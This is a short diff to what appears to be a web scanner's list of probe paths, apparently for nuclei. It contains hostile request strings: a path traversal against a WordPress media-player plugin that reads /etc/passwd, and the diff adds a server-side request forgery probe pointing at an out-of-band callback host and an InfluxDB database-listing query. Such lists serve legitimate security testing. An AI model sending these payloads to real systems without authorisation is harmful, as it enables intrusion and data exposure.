@@ -38,3 +38,5 @@
 /objects/nuclei.txt
 /node/1?_format=hal_json
 /wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../etc/passwd
+/getFavicon?host=http://oast.fun/
+/query?db=db&q=SHOW%20DATABASES
